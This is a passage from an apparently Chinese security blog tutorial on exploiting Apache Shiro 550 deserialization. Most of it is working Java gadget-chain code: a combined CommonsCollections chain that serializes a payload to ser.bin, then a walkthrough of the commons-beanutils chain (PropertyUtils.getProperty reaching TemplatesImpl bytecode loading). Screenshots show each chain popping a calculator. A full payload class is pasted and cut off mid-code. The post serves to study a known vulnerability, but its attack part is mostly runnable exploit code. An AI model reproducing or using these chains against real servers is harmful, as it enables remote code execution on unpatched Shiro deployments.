keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//cc3</span>        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>TemplatesImpl<span class="token operator">></span> templatesClass <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field nameField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field bytecodesField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D://netcat//Test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//cc2</span>        InvokerTransformer invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//cc5</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map decorate <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorate<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>BadAttributeValueExpException<span class="token operator">></span> badAttributeValueExpExceptionClass <span class="token operator">=</span> BadAttributeValueExpException<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field valField <span class="token operator">=</span> badAttributeValueExpExceptionClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">unserialize</span><span class="token punctuation">(</span>String Filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>Filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>同样的利用这个<code>ser.bin</code>生成payload：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"><br>也可以弹出计算器：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"></p><h2 id="shiro无依赖攻击"><a href="#shiro无依赖攻击" class="headerlink" title="shiro无依赖攻击"></a>shiro无依赖攻击</h2><p>之前我们都是利用shiro安装了CC的依赖进行攻击，那么原生的shiro是没有CC依赖的，我们要攻击原生的shiro就得先了解CB(<strong>commons-beanutils</strong>)<br>CB和CC2的关系比较近，可以先回顾一下CC2</p><h3 id="CB-commons-beanutils"><a href="#CB-commons-beanutils" class="headerlink" title="CB(commons-beanutils)"></a>CB(commons-beanutils)</h3><p>我们先来了解CB攻击，首先CB是为了更好地利用JavaBean研发的，我们来简单了解一下JaveBean:<br>简单理解就是如在Person类中，有属性name和age，这两个属性有对应的get和set方法分别设置他们的值和读取他们的值。这就是JavaBean<br>举个例子：<br>类Person：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>TransformerConfigurationException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>类Bean：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bean</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException <span class="token punctuation">{</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"qingfeng"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        person<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在类Bean中，我们<code>new</code>了一个<code>Person</code>，并且我们可以通过<code>getName</code>的方法来获取其中的属性name的值。同理如果想要获取<code>age</code>的值，可以利用方法<code>getAge</code>。<br>那么<code>commons-beanutils</code>的功能是什么呢？<br>前面提到过，<code>commons-beanutils</code>是为了更好地利用JavaBean，我们来看一个可以触发CB链的方法：<br><code>PropertyUtils.getProperty(person, &quot;age&quot;);</code><br>这一句便是我们漏洞的利用点，他的功能是什么呢，光看参数也能想到，他作用就是获取某个实例化后的类的属性。<br>我们修改类Bean:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>PropertyUtils<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bean</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"qingfeng"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>PropertyUtils<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行结果：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png"></p><p>我们在Person中设置了一个弹出计算器的点，就是获取name的值的时候会弹出计算器，让我们来试一下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>PropertyUtils<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bean</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"qingfeng"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>PropertyUtils<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png"><br>那么如何利用这个 形如 <code>get+属性名</code> 的方式来任意执行我们的代码呢？<br>我们在之前的CC2中学习到一个利用点叫<code>getOutputProperties</code>，不就是<code>get+属性名</code>的格式吗？<br>我们看一下方法<code>getOutputProperties</code>;</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> Properties <span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">TransformerConfigurationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>这里就是newTransformer可以触发Templates的newTransformer，从而达到任意执行代码的目的。<br>先来小试牛刀一下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>PropertyUtils<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bean</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>TemplatesImpl<span class="token operator">></span> templatesClass <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field nameField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field bytecodesField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D://netcat//Test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field tfactoryField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>PropertyUtils<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png"><br>成功执行</p><p>接下来的任务就是如何把他们串联起来，我们寻找何处调用了方法<code>getProperty</code><br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png"><br>发现老演员compare了，CC2链子计划通<br>直接贴payload了：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>BeanComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>PropertyUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>CompositeCollection<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>omg<span class="token punctuation">.</span>SendingContext<span class="token punctuation">.</span>RunTime<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//cc3</span>        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>TemplatesImpl<span class="token operator">></span> templatesClass <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field nameField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token 